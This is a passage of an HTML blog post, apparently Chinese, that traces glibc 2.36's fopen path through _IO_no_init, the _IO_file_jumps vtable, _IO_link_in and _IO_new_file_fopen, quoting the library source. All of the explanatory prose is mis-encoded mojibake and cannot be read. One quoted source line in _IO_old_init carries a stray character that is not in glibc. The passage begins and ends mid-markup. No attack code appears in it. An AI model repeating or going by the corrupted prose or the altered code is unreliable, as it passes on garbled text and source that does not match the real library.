class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­é¦–å…ˆé€šè¿‡mallocäº†ä¸€ä¸ª<code>locked_FILE</code>ç»“æ„ä½“ï¼Œå…¶ä¸­å°±åŒ…å«ç€<code>_IO_FILE_plus</code>ï¼Œå¹¶å°†æ•´ä¸ªç©ºé—´ç”±æŒ‡é’ˆ<strong>new_f</strong>æŒ‡å‘ã€‚<code>_IO_no_init</code>å’Œ<code>_IO_new_file_init_internal </code>å¯¹è™šè¡¨è¿›è¡Œäº†åˆå§‹åŒ–ã€‚</p><p>å…ˆæ¥çœ‹çœ‹<code>_IO_no_init</code>å‡½æ•°ï¼Œå¼€å¤´å°±è°ƒç”¨äº†<code>_IO_old_init</code></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L561</span><br><span class="hljs-type">void</span><br>_IO_no_init (FILE *fp, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> orientation,<br>     <span class="hljs-keyword">struct</span> _IO_wide_data *wd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *jmp)<br>&#123;<br>  _IO_old_init (fp, flags);<br>  fp-&gt;_mode = orientation;<br>  <span class="hljs-keyword">if</span> (orientation &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;_wide_data = wd;<br>      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br><br>      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">/* Cause predictable crash when a wide function is called on a byte</span><br><span class="hljs-comment">       stream.  */</span><br>    fp-&gt;_wide_data = (<span class="hljs-keyword">struct</span> _IO_wide_data *) <span class="hljs-number">-1L</span>;<br>  fp-&gt;_freeres_list = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L530</span><br><span class="hljs-type">void</span><br>_IO_old_init (FILE *fp, <span class="hljs-type">int</span> flags)<br>&#123;<br>  fp-&gt;_flags = _IO_MAGIC|flags;<br>  fp-&gt;_flags2 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (stdio_needs_locking)<br>    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_chain = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">/* Not necessary. */</span><br>v<br>  fp-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_markers = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_cur_column = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br>  fp-&gt;_vtable_offset = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_lock != <span class="hljs-literal">NULL</span>)<br>    _IO_lock_init (*fp-&gt;_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>_IO_old_init</code>å‡½æ•°æœ‰ä¸¤ä¸ªé‡è½½ï¼Œä¸Šé¢è°ƒç”¨çš„æ˜¯2å‚æ•°ï¼Œå³<code>_IO_old_init (FILE *fp, int flags)</code>ï¼›å¦å¤–è¿˜æœ‰ä¸€ä¸ª5å‚æ•°<code>_IO_no_init (FILE *fp, int flags, int orientation,struct _IO_wide_data *wd, const struct _IO_jump_t *jmp)</code>ï¼Œæºç å°±å®šä¹‰åœ¨2å‚æ•°çš„åé¢</p></blockquote><p>å¯ä»¥çœ‹åˆ°ï¼Œé¦–å…ˆ<code>_IO_old_init</code>å¯¹<code>_IO_FILE</code>çš„ä¸»è¦å‡ ä¸ªæˆå‘˜å˜é‡è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œç„¶åç”±<code>_IO_no_init</code>ä¼šæ ¹æ®ä¼ å…¥å‚æ•°<strong>orientation</strong>çš„å€¼å†³å®šæ˜¯å¦å¯¹<code>_wide_data</code>ç›¸å…³å€¼åšåˆå§‹åŒ–(åŒæ—¶éœ€æ³¨æ„åˆ°<code>fopen</code>æ˜¯ç›´æ¥å¸¸é‡0ä¼ å…¥ï¼Œæ‰€ä»¥æ˜¯å¿…å®šåˆå§‹åŒ–è¯¥åŒºåŸŸ)ã€‚</p><p>ç„¶åæ¥ä¸‹æ¥æ‰§è¡Œäº† <strong>_IO_JUMPS (&amp;new_f-&gt;fp) &#x3D;  &amp; _IO_file_jumps</strong>ï¼Œè¿™é‡Œçš„<code>_IO_JUMPS</code>å…¶å®å°±æ˜¯<strong>vtable</strong>æŒ‡é’ˆï¼Œè€Œ<code>_IO_FILE_jumps</code>å°±æ˜¯æˆ‘ä»¬ä¹‹å‰è°ˆåˆ°çš„è™šè¡¨ã€‚ç›¸å½“äºè®©<strong>vtable</strong>æŒ‡é’ˆæŒ‡å‘äº†<strong>è™šè¡¨</strong>ï¼Œ<code>_IO_JUMPS</code>å’Œ<code>_IO_FILE_jumps</code>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L98</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_JUMPS(THIS) (THIS)-&gt;vtable</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L1432</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_file_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_file_finish),<br>  JUMP_INIT(overflow, _IO_file_overflow),<br>  JUMP_INIT(underflow, _IO_file_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_default_pbackfail),<br>  JUMP_INIT(xsputn, _IO_file_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_new_file_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, _IO_new_file_sync),<br>  JUMP_INIT(doallocate, _IO_file_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¥ç€è°ƒç”¨äº†<code>_IO_new_file_init_internal</code>,æºç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L105</span><br><span class="hljs-type">void</span><br>_IO_new_file_init_internal (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-comment">/* POSIX.1 allows another file handle to be used to change the position</span><br><span class="hljs-comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span><br><span class="hljs-comment">     position before we do the first fseek (and until a following fflush). */</span><br>  fp-&gt;file._offset = _IO_pos_BAD;<br>  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;<br><br>  _IO_link_in (fp);<br>  fp-&gt;file._fileno = <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>_IO_FILE</code>çš„<strong>flag</strong>è¢«è®¾ç½®<strong>CLOSED_FILEBUF_FLAGS</strong>ï¼Œå…·ä½“å«ä¹‰å¯çœ‹å¦‚ä¸‹å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLOSED_FILEBUF_FLAGS \</span><br><span class="hljs-meta">  (_IO_IS_FILEBUF+_IO_NO_READS+_IO_NO_WRITES+_IO_TIED_PUT_GET)</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L81</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF        0x2000</span><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS          0x0004 <span class="hljs-comment">/* Reading not allowed.  */</span></span><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L71</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="hljs-comment">/* Writing not allowed.  */</span></span><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L78</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="hljs-comment">/* Put and get pointer move in unison.  */</span></span><br></code></pre></td></tr></table></figure><p>éšåè°ƒç”¨äº†<code>_IO_link_in</code>ï¼Œé¦–å…ˆåˆ¤æ–­ <strong>_flags</strong>æ˜¯å¦å·²ç»è¢«linkè¿‡ã€‚å¦‚æœæ²¡æœ‰ï¼Œå°±å°† <strong>_chain</strong>èµ‹å€¼ä¸º <strong>_IO_list_all</strong>ã€‚å…¶å®å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªå¾€å•é“¾è¡¨ä¸Šå¢æ·»èŠ‚ç‚¹ï¼Œä¸²è”äº†æ‰€æœ‰çš„<code>_IO_FILE_plus</code></p><blockquote><p><strong>_flags</strong>ç›¸å…³åˆ¤æ–­å’Œé™„åŠ ä¸»è¦é€šè¿‡ä½è¿ç®—å®ç°ï¼Œè¿™é‡Œä¸åšè¿™ç§ç¨‹åº¦çš„å…·ä½“è§£é‡Š(éƒ½å¼€å§‹ç ”ç©¶IO_FILEäº†ï¼Œæ€»ä¸èƒ½ä½è¿ç®—è¿˜æä¸æ˜ç™½å§)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L86</span><br><span class="hljs-type">void</span><br>_IO_link_in (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (FILE *) fp;<br>      _IO_flockfile ((FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      fp-&gt;file._chain = (FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_link_in)<br></code></pre></td></tr></table></figure><p>åœ¨linkå®Œæˆåï¼Œå°±ä¼šæ¥ç€è°ƒç”¨<code>_IO_file_fopen</code>ï¼Œå®é™…å‡½æ•°å®šä¹‰çš„ä¸º<code> _IO_new_file_fopen</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L211</span><br><br>FILE *<br>_IO_new_file_fopen (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode,<br>    <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> oflags = <span class="hljs-number">0</span>, omode;<br>  <span class="hljs-type">int</span> read_write;<br>  <span class="hljs-type">int</span> oprot = <span class="hljs-number">0666</span>;<br>  <span class="hljs-type">int</span> i;<br>  FILE *result;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cs;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *last_recognized;<br><br>  <span class="hljs-keyword">if</span> (_IO_file_is_open (fp))<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">switch</span> (*mode)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>      omode = O_RDONLY;<br>      read_write = _IO_NO_WRITES;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_TRUNC;<br>      read_write = _IO_NO_READS;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_APPEND;<br>      read_write = _IO_NO_READS|_IO_IS_APPENDING;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  last_recognized = mode;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">7</span>; ++i)<br>    &#123;<br>      <span class="hljs-keyword">switch</span> (*++mode)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\0&#x27;</span>:<br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>  omode = O_RDWR;<br>  read_write &amp;= _IO_IS_APPENDING;<br>  last_recognized = mode;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>  oflags |= O_EXCL;<br>  last_recognized = mode;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>  last_recognized = mode;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;m&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br>  oflags |= O_CLOEXEC;<br>  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br>  <span class="hljs-comment">/* Ignore.  */</span><br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,<br>  is32not64);<br><br>  <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Test whether the mode string specifies the conversion.  */</span><br>      cs = <span class="hljs-built_in">strstr</span> (last_recognized + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;,ccs=&quot;</span>);<br>      <span class="hljs-keyword">if</span> (cs != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-comment">/* Yep.  Load the appropriate conversions and set the orientation</span><br><span class="hljs-comment">     to wide.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gconv_fcts</span> <span class="hljs-title">fcts</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span>;</span><br>  <span class="hljs-type">char</span> *endp = __strchrnul (cs + <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;,&#x27;</span>);<br>  <span class="hljs-type">char</span> *ccs = <span class="hljs-built_in">malloc</span> (endp - (cs + <span class="hljs-number">5</span>) + <span class="hljs-number">3</span>);<br><br>  <span class="hljs-keyword">if</span> (ccs == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-type">int</span> malloc_err = errno;  <span class="hljs-comment">/* Whatever malloc failed with.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      __set_errno (malloc_err);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  *((<span class="hljs-type">char</span> *) __mempcpy (ccs, cs + <span class="hljs-number">5</span>, endp - (cs + <span class="hljs-number">5</span>))) = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  strip (ccs, ccs);<br><br>  <span class="hljs-keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span><br>   ? upstr (ccs, cs + <span class="hljs-number">5</span>) : ccs) != <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Something went wrong, we cannot load the conversion modules.</span><br><span class="hljs-comment"> This means we cannot proceed since the user explicitly asked</span><br><span class="hljs-comment"> for these.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      <span class="hljs-built_in">free</span> (ccs);<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-built_in">free</span> (ccs);<br><br>  assert (fcts.towc_nsteps == <span class="hljs-number">1</span>);<br>  assert (fcts.tomb_nsteps == <span class="hljs-number">1</span>);<br><br>  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;<br>  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;<br><br>  <span class="hljs-comment">/* Clear the state.  We start all over again.  */</span><br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br><br>  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;<br><br>  cc-&gt;__cd_in.step = fcts.towc;<br><br>  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_in.step_data.__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;<br>  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  cc-&gt;__cd_out.step = fcts.tomb;<br><br>  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_out.step_data.__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;<br>  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  <span class="hljs-comment">/* From now on use the wide character callback functions.  */</span><br>  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;<br><br>  <span class="hljs-comment">/* Set the mode now.  */</span><br>  result-&gt;_mode = <span class="hljs-number">1</span>;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br>libc_hidden_ver (_IO_new_file_fopen, 